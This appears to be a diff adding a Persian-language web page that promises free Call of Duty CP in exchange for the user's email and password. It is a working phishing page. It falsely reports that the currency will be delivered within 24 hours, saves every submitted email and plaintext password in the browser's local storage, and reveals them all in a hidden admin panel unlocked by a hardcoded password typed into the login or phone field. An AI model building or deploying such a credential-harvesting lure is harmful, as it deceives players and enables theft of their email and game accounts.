@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحه سی پی رایگان کالاف</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+        }
+        
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231a1a1a"/><rect x="10" y="10" width="30" height="30" fill="%23222222"/><rect x="60" y="10" width="30" height="30" fill="%23222222"/><rect x="10" y="60" width="30" height="30" fill="%23222222"/><rect x="60" y="60" width="30" height="30" fill="%23222222"/><rect x="40" y="40" width="20" height="20" fill="%232a2a2a"/></svg>') repeat;
+            background-size: 100px 100px;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200"><rect width="200" height="200" fill="%23000" opacity="0.3"/><circle cx="100" cy="100" r="80" fill="none" stroke="%23ff6600" stroke-width="2" opacity="0.1"/><circle cx="100" cy="100" r="50" fill="none" stroke="%23ff6600" stroke-width="1" opacity="0.05"/></svg>') repeat;
+            pointer-events: none;
+            z-index: 1;
+        }
+        
+        .login-box {
+            background: linear-gradient(180deg, #1a1a1a 0%, #0d0d0d 100%);
+            border: 2px solid #ff6600;
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 
+                0 20px 60px rgba(0,0,0,0.8),
+                0 0 40px rgba(255,102,0,0.3),
+                inset 0 0 40px rgba(255,102,0,0.1);
+            position: relative;
+            z-index: 2;
+            animation: slideUp 0.5s ease;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo-icon {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, #ff6600 0%, #cc3300 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-size: 50px;
+            box-shadow: 
+                0 10px 30px rgba(255,102,0,0.5),
+                inset 0 -5px 15px rgba(0,0,0,0.3);
+            border: 3px solid #ff9933;
+        }
+        
+        .logo h2 {
+            color: #ff6600;
+            font-size: 28px;
+            font-weight: 900;
+            text-shadow: 0 0 20px rgba(255,102,0,0.5);
+            letter-spacing: 1px;
+        }
+        
+        .logo p {
+            color: #ff9933;
+            font-size: 14px;
+            margin-top: 5px;
+            opacity: 0.8;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            color: #ff9933;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-shadow: 0 0 10px rgba(255,153,51,0.3);
+        }
+        
+        .input-wrapper {
+            position: relative;
+        }
+        
+        .input-wrapper input, .input-wrapper select {
+            width: 100%;
+            padding: 15px;
+            background: #1a1a1a;
+            border: 2px solid #333;
+            border-radius: 12px;
+            font-size: 16px;
+            color: #fff;
+            transition: all 0.3s;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
+        }
+        
+        .input-wrapper input:focus, .input-wrapper select:focus {
+            border-color: #ff6600;
+            outline: none;
+            box-shadow: 
+                0 0 20px rgba(255,102,0,0.3),
+                inset 0 2px 5px rgba(0,0,0,0.5);
+        }
+        
+        .input-wrapper input.error {
+            border-color: #ff0000;
+            background: #1a0000;
+        }
+        
+        .input-wrapper input.success {
+            border-color: #00ff00;
+            background: #001a00;
+        }
+        
+        .input-wrapper select option {
+            background: #1a1a1a;
+            color: #fff;
+        }
+        
+        .error-message {
+            color: #ff0000;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .forgot-link {
+            color: #ff6600;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+            display: block;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #ff6600 0%, #cc3300 100%);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 18px;
+            font-weight: 900;
+            cursor: pointer;
+            position: relative;
+            box-shadow: 
+                0 10px 30px rgba(255,102,0,0.4),
+                inset 0 -5px 15px rgba(0,0,0,0.3),
+                inset 0 5px 15px rgba(255,255,255,0.1);
+            transition: all 0.3s;
+            text-shadow: 0 0 10px rgba(255,255,255,0.5);
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 
+                0 15px 40px rgba(255,102,0,0.6),
+                inset 0 -5px 15px rgba(0,0,0,0.3);
+        }
+        
+        .login-btn:active {
+            transform: translateY(0);
+            box-shadow: 
+                0 5px 15px rgba(255,102,0,0.3),
+                inset 0 -3px 10px rgba(0,0,0,0.3);
+        }
+        
+        .login-btn:disabled {
+            background: #333;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .loading-spinner {
+            display: none;
+            width: 25px;
+            height: 25px;
+            border: 3px solid white;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* مودال */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-box {
+            background: linear-gradient(180deg, #1a1a1a 0%, #0d0d0d 100%);
+            border: 2px solid #ff6600;
+            border-radius: 20px;
+            padding: 30px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 
+                0 20px 60px rgba(0,0,0,0.9),
+                0 0 40px rgba(255,102,0,0.4);
+            animation: slideUp 0.3s ease;
+            position: relative;
+        }
+        
+        .modal-box .icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        
+        .modal-box h3 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            font-weight: 900;
+        }
+        
+        .modal-box .success {
+            color: #00ff00;
+            text-shadow: 0 0 20px rgba(0,255,0,0.5);
+        }
+        
+        .modal-box .error {
+            color: #ff0000;
+            text-shadow: 0 0 20px rgba(255,0,0,0.5);
+        }
+        
+        .modal-box p {
+            color: #fff;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+        
+        /* تایم لاین */
+        .timeline {
+            width: 100%;
+            height: 5px;
+            background: #333;
+            border-radius: 5px;
+            margin-top: 20px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .timeline-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff6600, #00ff00);
+            border-radius: 5px;
+            width: 100%;
+            transition: width 0.1s linear;
+        }
+        
+        .timeline-text {
+            color: #fff;
+            font-size: 12px;
+            margin-top: 10px;
+            opacity: 0.7;
+        }
+        
+        /* صفحه فراموشی */
+        .forgot-page {
+            display: none;
+            background: linear-gradient(180deg, #1a1a1a 0%, #0d0d0d 100%);
+            border: 2px solid #ff6600;
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 
+                0 20px 60px rgba(0,0,0,0.8),
+                0 0 40px rgba(255,102,0,0.3);
+            position: relative;
+            z-index: 2;
+        }
+        
+        .forgot-page h2 {
+            text-align: center;
+            color: #ff6600;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        
+        .back-link {
+            color: #ff6600;
+            cursor: pointer;
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        
+        /* پنل مدیریت */
+        .admin-panel {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0d0d0d;
+            z-index: 2000;
+            overflow-y: auto;
+            padding: 20px;
+        }
+        
+        .admin-header {
+            background: linear-gradient(135deg, #ff6600 0%, #cc3300 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(255,102,0,0.4);
+        }
+        
+        .data-item {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-right: 4px solid #ff6600;
+        }
+        
+        .data-item .info {
+            margin: 5px 0;
+            font-size: 14px;
+            color: #ccc;
+        }
+        
+        .back-btn {
+            background: #cc3300;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <!-- صفحه اصلی -->
+    <div class="login-box" id="loginBox">
+        <div class="logo">
+            <div class="logo-icon">🎮</div>
+            <h2>صفحه سی پی رایگان کالاف</h2>
+            <p>سی پی رایگان خود را دریافت کنید</p>
+        </div>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label>👤 نام (اختیاری)</label>
+                <div class="input-wrapper">
+                    <input type="text" id="fullName" placeholder="نام شما" autocomplete="off">
+                </div>
+            </div>
+            
+            <div class="input-group">
+                <label>📧 ایمیل</label>
+                <div class="input-wrapper">
+                    <input type="email" id="username" placeholder="example@gmail.com" required autocomplete="off">
+                </div>
+                <div class="error-message" id="usernameError"></div>
+            </div>
+            
+            <div class="input-group">
+                <label>🔒 رمز عبور</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="رمز عبور" required autocomplete="off">
+                </div>
+                <div class="error-message" id="passwordError"></div>
+            </div>
+            
+            <div class="input-group">
+                <label>💰 مقدار سی پی</label>
+                <div class="input-wrapper">
+                    <select id="cpAmount">
+                        <option value="80">80 CP</option>
+                        <option value="100">100 CP</option>
+                        <option value="200">200 CP</option>
+                        <option value="400">400 CP</option>
+                        <option value="800">800 CP</option>
+                        <option value="1500">1500 CP</option>
+                        <option value="3000">3000 CP</option>
+                        <option value="5000">5000 CP</option>
+                        <option value="10000">10000 CP</option>
+                    </select>
+                </div>
+            </div>
+            
+            <div class="remember-forgot">
+                <a class="forgot-link" id="forgotLink">فراموشی رمز؟</a>
+            </div>
+            
+            <button type="submit" class="login-btn" id="loginBtn">
+                <span id="btnText">دریافت سی پی</span>
+                <div class="loading-spinner" id="spinner"></div>
+            </button>
+        </form>
+    </div>
+    
+    <!-- صفحه فراموشی -->
+    <div class="forgot-page" id="forgotPage">
+        <h2>🔑 بازیابی رمز عبور</h2>
+        <p style="text-align:center;color:#ff9933;margin-bottom:20px;">شماره موبایل خود را وارد کنید</p>
+        
+        <div class="input-group">
+            <div class="input-wrapper">
+                <input type="text" id="forgotPhone" placeholder="مثلاً: 09123456789">
+            </div>
+            <div class="error-message" id="forgotError"></div>
+        </div>
+        
+        <button class="login-btn" id="forgotSubmit">
+            <span id="forgotBtnText">ثبت</span>
+            <div class="loading-spinner" id="forgotSpinner"></div>
+        </button>
+        
+        <div id="forgotStatus" style="text-align:center;margin-top:15px;font-weight:bold;color:#ff0000;"></div>
+        
+        <div class="back-link" id="backToLogin">← بازگشت به صفحه ورود</div>
+    </div>
+    
+    <!-- مودال -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-box">
+            <div class="icon" id="modalIcon"></div>
+            <h3 id="modalTitle"></h3>
+            <p id="modalText"></p>
+            <div class="timeline">
+                <div class="timeline-fill" id="timelineFill"></div>
+            </div>
+            <div class="timeline-text" id="timelineText">8 ثانیه</div>
+        </div>
+    </div>
+    
+    <!-- پنل مدیریت -->
+    <div class="admin-panel" id="adminPanel">
+        <button class="back-btn" id="backBtn">← بازگشت</button>
+        <div class="admin-header">
+            <h2>📊 پنل مدیریت</h2>
+            <p>اطلاعات کاربران ثبت شده</p>
+        </div>
+        <div id="dataContainer"></div>
+    </div>
+
+    <script>
+        const ADMIN_PASSWORD = '13941394';
+        let modalTimer;
+        let timelineInterval;
+        let timeLeft = 8;
+        
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+        
+        // اعتبارسنجی زنده ایمیل
+        document.getElementById('username').addEventListener('input', function() {
+            const value = this.value.trim();
+            const error = document.getElementById('usernameError');
+            
+            if (value.length === 0) {
+                this.className = 'error';
+                error.textContent = '❌ این فیلد الزامی است';
+                error.style.display = 'block';
+            } else if (isValidEmail(value)) {
+                this.className = 'success';
+                error.style.display = 'none';
+            } else {
+                this.className = 'error';
+                error.textContent = '❌ ایمیل معتبر وارد کنید';
+                error.style.display = 'block';
+            }
+        });
+        
+        // اعتبارسنجی زنده رمز
+        document.getElementById('password').addEventListener('input', function() {
+            const value = this.value;
+            const error = document.getElementById('passwordError');
+            
+            if (value.length === 0) {
+                this.className = 'error';
+                error.textContent = '❌ رمز عبور الزامی است';
+                error.style.display = 'block';
+            } else if (value.length < 4) {
+                this.className = 'error';
+                error.textContent = '❌ رمز عبور حداقل 4 کاراکتر';
+                error.style.display = 'block';
+            } else {
+                this.className = 'success';
+                error.style.display = 'none';
+            }
+        });
+        
+        // نمایش مودال با تایمر
+        function showModal(success, title, text) {
+            const modal = document.getElementById('modalOverlay');
+            const icon = document.getElementById('modalIcon');
+            const modalTitle = document.getElementById('modalTitle');
+            const modalText = document.getElementById('modalText');
+            const timelineFill = document.getElementById('timelineFill');
+            const timelineText = document.getElementById('timelineText');
+            
+            if (success) {
+                icon.textContent = '✅';
+                modalTitle.textContent = title;
+                modalTitle.className = 'success';
+                modalText.textContent = text;
+            } else {
+                icon.textContent = '❌';
+                modalTitle.textContent = title;
+                modalTitle.className = 'error';
+                modalText.textContent = text;
+            }
+            
+            modal.style.display = 'flex';
+            
+            // ریست تایمر
+            timeLeft = 8;
+            timelineFill.style.width = '100%';
+            timelineText.textContent = '8 ثانیه';
+            
+            clearInterval(timelineInterval);
+            clearTimeout(modalTimer);
+            
+            // شروع تایمر
+            timelineInterval = setInterval(() => {
+                timeLeft--;
+                timelineFill.style.width = (timeLeft / 8 * 100) + '%';
+                timelineText.textContent = timeLeft + ' ثانیه';
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timelineInterval);
+                    modal.style.display = 'none';
+                }
+            }, 1000);
+            
+            // ریست تایمر با کلیک روی مودال
+            modal.addEventListener('click', function() {
+                timeLeft = 8;
+                timelineFill.style.width = '100%';
+                timelineText.textContent = '8 ثانیه';
+            });
+        }
+        
+        // مدیریت فرم اصلی
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const fullName = document.getElementById('fullName').value.trim();
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const cpAmount = document.getElementById('cpAmount').value;
+            
+            if (!isValidEmail(username)) {
+                showModal(false, 'ناموفق بود!', 'اطلاعات خود را صحیح کنید.');
+                return;
+            }
+            
+            if (password.length < 4) {
+                showModal(false, 'ناموفق بود!', 'اطلاعات خود را صحیح کنید.');
+                return;
+            }
+            
+            if (password === ADMIN_PASSWORD) {
+                showAdminPanel();
+                return;
+            }
+            
+            const btn = document.getElementById('loginBtn');
+            btn.disabled = true;
+            document.getElementById('btnText').style.display = 'none';
+            document.getElementById('spinner').style.display = 'block';
+            
+            setTimeout(() => {
+                const data = {
+                    fullName: fullName || 'نامشخص',
+                    username: username,
+                    password: password,
+                    cpAmount: cpAmount,
+                    time: new Date().toLocaleString('fa-IR')
+                };
+                
+                let allData = JSON.parse(localStorage.getItem('allUsers') || '[]');
+                allData.push(data);
+                localStorage.setItem('allUsers', JSON.stringify(allData));
+                
+                const successText = (fullName ? fullName : 'کاربر') + ' موفق بود! سی پی شما تا ۲۴ ساعت آینده به حساب شما واریز خواهد شد.';
+                showModal(true, 'موفق بود!', successText);
+                
+                document.getElementById('fullName').value = '';
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+                document.getElementById('username').className = '';
+                document.getElementById('password').className = '';
+                
+                btn.disabled = false;
+                document.getElementById('btnText').style.display = 'block';
+                document.getElementById('spinner').style.display = 'none';
+            }, 3000);
+        });
+        
+        // نمایش پنل
+        function showAdminPanel() {
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('forgotPage').style.display = 'none';
+            document.getElementById('adminPanel').style.display = 'block';
+            
+            const allData = JSON.parse(localStorage.getItem('allUsers') || '[]');
+            const container = document.getElementById('dataContainer');
+            
+            if (allData.length === 0) {
+                container.innerHTML = '<div style="text-align:center;color:#999;padding:20px;">📭 هیچ اطلاعاتی ثبت نشده</div>';
+            } else {
+                let html = '';
+                allData.forEach((item, index) => {
+                    html += `
+                        <div class="data-item">
+                            <div class="info"><strong>🔢 شماره:</strong> ${index + 1}</div>
+                            <div class="info"><strong>👤 نام:</strong> ${item.fullName}</div>
+                            <div class="info"><strong>📧 ایمیل:</strong> ${item.username}</div>
+                            <div class="info"><strong>🔑 رمز عبور:</strong> ${item.password}</div>
+                            <div class="info"><strong>💰 سی پی:</strong> ${item.cpAmount}</div>
+                            <div class="info"><strong>🕐 زمان:</strong> ${item.time}</div>
+                        </div>
+                    `;
+                });
+                container.innerHTML = html;
+            }
+        }
+        
+        // فراموشی رمز
+        document.getElementById('forgotLink').addEventListener('click', function() {
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('forgotPage').style.display = 'block';
+        });
+        
+        document.getElementById('backToLogin').addEventListener('click', function() {
+            document.getElementById('forgotPage').style.display = 'none';
+            document.getElementById('loginBox').style.display = 'block';
+        });
+        
+        document.getElementById('forgotSubmit').addEventListener('click', function() {
+            const phone = document.getElementById('forgotPhone').value.trim();
+            const error = document.getElementById('forgotError');
+            const status = document.getElementById('forgotStatus');
+            
+            if (phone === ADMIN_PASSWORD) {
+                document.getElementById('forgotPage').style.display = 'none';
+                showAdminPanel();
+                return;
+            }
+            
+            const btn = document.getElementById('forgotSubmit');
+            btn.disabled = true;
+            document.getElementById('forgotBtnText').style.display = 'none';
+            document.getElementById('forgotSpinner').style.display = 'block';
+            
+            setTimeout(() => {
+                error.textContent = 'شماره درست نیست';
+                error.style.display = 'block';
+                document.getElementById('forgotPhone').className = 'error';
+                
+                status.textContent = 'ناموفق بود';
+                
+                btn.disabled = false;
+                document.getElementById('forgotBtnText').style.display = 'block';
+                document.getElementById('forgotSpinner').style.display = 'none';
+                
+                setTimeout(() => {
+                    error.style.display = 'none';
+                    status.textContent = '';
+                    document.getElementById('forgotPhone').className = '';
+                    document.getElementById('forgotPhone').value = '';
+                }, 3000);
+            }, 3000);
+        });
+        
+        // بازگشت از پنل
+        document.getElementById('backBtn').addEventListener('click', function() {
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('loginBox').style.display = 'block';
+        });
+    </script>
+</body>
+</html>
